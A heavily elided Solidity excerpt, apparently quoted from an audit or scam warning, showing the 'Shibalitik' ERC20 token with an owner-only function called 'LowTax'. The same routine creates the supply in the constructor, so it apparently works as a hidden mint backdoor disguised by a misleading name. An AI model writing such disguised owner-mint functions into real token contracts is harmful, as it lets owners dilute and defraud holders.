...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function LowTax(uint256 amount) public onlyOwner {

    _LowTax(msg.sender, amount);
    ...
    function _LowTax(address account, uint256 amount) internal virtual {
...
contract Shibalitik is ERC20 {
    ...
    constructor() public ERC20("Shibalitik", "SHIBALITIK") {

        _LowTax(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
